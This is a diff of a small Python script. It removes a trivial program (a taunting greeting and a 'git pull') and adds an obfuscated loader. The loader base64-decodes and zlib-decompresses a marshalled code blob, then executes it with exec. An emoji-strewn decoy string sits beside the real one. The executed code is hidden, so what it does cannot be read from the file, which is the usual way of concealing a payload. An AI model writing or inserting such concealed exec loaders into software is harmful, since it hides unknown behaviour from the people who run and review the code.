@@ -1,20 +1,5 @@
-import os, sys, requests
 
-def Mulai():
-	try:
-		os.system("clear")
-		print("Hello Anak Pungut. From SllowlyDev🖕")
-	except:
-		pass
-
-if __name__ == "__main__":
-	try:
-		os.system("clear")
-		print("Wait For a minute")
-		time.sleep(2)
-		print("Check Your Files Data")
-		time.sleep(2)
-		os.system("git pull")
-		Mulai()
-	except:
-		pass
+import marshal, zlib, base64
+b64 = 'eJyVUktrFEEQrq6e⚡ZlNNmJIRHwEGyMmGz💀YuwiJYRX🔥o💀jI7mUZdpo4u/NYe⚡✨Ms6eNRLJ/Q🔒UvHjxJ/oW/QGTFZ🔒h48JT🌟Y💀4hJ6💫nu💥nuJX💥oqvq6qr6qj/4Lx47Ss7vT🔥O🔒TmG🔒SGyoHllRIZrG💀m✨UV✨uI✨V🔥SumrQxDSD8P💀🔥wq🔥fgzDGVDXLgEZmjmeqJmNYvDqjJn✨rRzl0ze🔥🌟9💥H⚡UDehHEYnIZGrLqfeWlmGFFPM78mmpdry🔥VJJKJV+🔒VDIP🔒ek/🌈XE🔒Hzni💀9RDFI/Q💀Hqs0GOlS7F✨s7khwttpwiNu⚡x6🌟d40Gexq6y⚡Ewy0r💀💫9jzFF6xo0X+Jvny8UORxuj5💫💫6P/I🔒7sdoUlht8g🌈🌈JsZ8ToTv🌟jGL🌈SWg🌟lhju🌟eDL9m🌈IUEFtG5X🌈4mqx87💀L49uo/dDv/sK5vQQJ✨luY⚡/f🌈NPUdm4SvOEVjvVp🌈DMutVoUUozX60r🔒💀VvIEM5hjuWH🔒d6QQrUsPXvF✨g5W9UL💀SZXOfLRq🔥0dKX0+xm✨NvFvJ💀💀xDQdOtYFfx🌈yP/🔥jJ🌟🔒💫ng0piVzD4SlRLg⚡FJjHVtzlv💀jmQyMtrKMu85💥hm✨PP7YiwTNd⚡uk🌈4JJYT8gYnfMPFPUYmWX🔒💀l0Gn9pF💫SHEJtE4f🌟Nw/💥💥pJ7X+vi9U0stG+tz6zOdJ6t💥💫nQG🌈🌈kJ9💀jysddvHy64P🌈UMg🌟K🌈🌟🌈kvK+f/K⚡f5+💫WRuD7💀💀6M0v8+xriK'
+b64 = ''.join('eJyVUktrFEEQrq6e2ZlNNmJIRHwEGyMmGzCYuwiJYRXBoCjI7mUZdpo4u/NYe2aMs6eNRLJ/QAUvHjxJ/oW/QGTFZAh48JTbYC4hJ6cnu3nuJX3oqvq6qr6qj/4Lx47Ss7vTBOATmGASGyoHllRIZrGCmaUVauIaVBSumrQxDSD8PCBwqBfgzDGVDXLgEZmjmeqJmNYvDqjJnarRzl0zeBb93H2UDehHEYnIZGrLqfeWlmGFFPM78mmpdryBVJJKJV+AVDIPAek/1XEAHzniC9RDFI/QCHqs0GOlS7Fas7khwttpwiNu2x6bd40Gexq6y2Ewy0rCc9jzFF6xo0X+Jvny8UORxuj5cc6P/IA7sdoUlht8g11JsZ8ToTvbjGL1SWgblhjubeDL9m1IUEFtG5X14mqx87CL49uo/dDv/sK5vQQJaluY2/f1NPUdm4SvOEVjvVp1DMutVoUUozX60rACVvIEM5hjuWHAd6QQrUsPXvFag5W9ULCSZXOfLRqB0dKX0+xmaNvFvJCCxDQdOtYFfx1yP/BjJbAcng0piVzD4SlRLg2FJjHVtzlvCjmQyMtrKMu853hmaPP7YiwTNd2uk14JJYT8gYnfMPFPUYmWXACl0Gn9pFcSHEJtE4fbNw/33pJ7X+vi9U0stG+tz6zOdJ6t3cnQG11kJ9CjysddvHy64P1UMgbK1b1kvK+f/K2f5+cWRuD7CC6M0v8+xriK')
+exec(marshal.loads(zlib.decompress(base64.b64decode(b64))))
